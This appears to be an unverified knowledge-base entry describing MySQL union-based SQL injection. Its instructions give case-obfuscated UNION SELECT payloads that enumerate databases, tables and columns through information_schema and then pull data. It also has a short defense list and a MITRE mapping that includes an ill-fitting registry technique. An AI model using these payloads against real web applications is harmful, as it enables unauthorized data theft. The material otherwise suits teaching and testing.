---
id: 4169a74f-9201-493c-98a3-883efeb94e2b
name: Extracting Database Information using MySQL Union Based Injection
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:34.356733+00:00'
updated_at: '2023-04-10T20:22:52.020436+00:00'
tactics:
- '[[Collection|TA0009 - Collection]]'
- '[[Discovery|TA0007 - Discovery]]'
techniques:
- '[[Data from Local System|T1005 - Data from Local System]]'
- '[[Query Registry|T1012 - Query Registry]]'
- '[[System Information Discovery|T1082 - System Information Discovery]]'
tags:
- '[[Extract database with information_schema]]'
- '[[MYSQL Injection]]'
- '[[MYSQL Union Based]]'
---

# Extracting Database Information using MySQL Union Based Injection

## Summary

MySQL is a popular open-source relational database management system. One of the most common vulnerabilities in web applications is SQL injection. Attackers can exploit SQL injection vulnerabilities to extract sensitive information from a database. In this procedure, we will demonstrate how to extr

## Description

# Description

MySQL is a popular open-source relational database management system. One of the most common vulnerabilities in web applications is SQL injection. Attackers can exploit SQL injection vulnerabilities to extract sensitive information from a database. In this procedure, we will demonstrate how to extract database information using MySQL union-based injection. The attack works by injecting malicious SQL statements into a vulnerable web application, which then executes the statements on the underlying database. The attacker can then extract information from the database using the union operator. The information_schema database is a system database that contains metadata about all other databases in the MySQL instance. By querying the information_schema database, an attacker can extract information about the database schema and contents.

 

## Requirements

1. Access to a vulnerable web application

1. Knowledge of SQL injection techniques

 

## Defense

1. Use parameterized queries or prepared statements to prevent SQL injection

1. Implement input validation and sanitization to prevent injection attacks

1. Use database permissions to restrict access to sensitive information

 

## Objectives

1. Extract sensitive information from the database

1. Identify the database schema and contents

 

# Instructions

1. To extract the names of the databases, tables, and columns using SQL injection, execute the following commands:
1. To extract the database names: UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata
2. To extract the table names: UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,table_name,0x7C)+fRoM+information_schema.tables+wHeRe+table_schema=...
3. To extract the column names: UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,column_name,0x7C)+fRoM+information_schema.columns+wHeRe+table_name=...
4. To extract the data: UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,data,0x7C)+fRoM+...

 



**Code**: [[UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,schema_]]



> The above SQL injection commands are used to extract sensitive information such as database names, table names, and column names from the target system. The 'UniOn Select' command is used to combine the results of multiple SELECT statements into a single result set. The 'gRoUp_cOncaT' function is used to concatenate strings together. The 'information_schema' table contains metadata about the database system, including information about databases, tables, and columns. By injecting these commands into vulnerable input fields, an attacker can extract sensitive information from the target system.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection|TA0009 - Collection]]
- [[Discovery|TA0007 - Discovery]]

### Techniques

- [[Data from Local System|T1005 - Data from Local System]]
- [[Query Registry|T1012 - Query Registry]]
- [[System Information Discovery|T1082 - System Information Discovery]]

## Tags

- [[Extract database with information_schema]]
- [[MYSQL Injection]]
- [[MYSQL Union Based]]


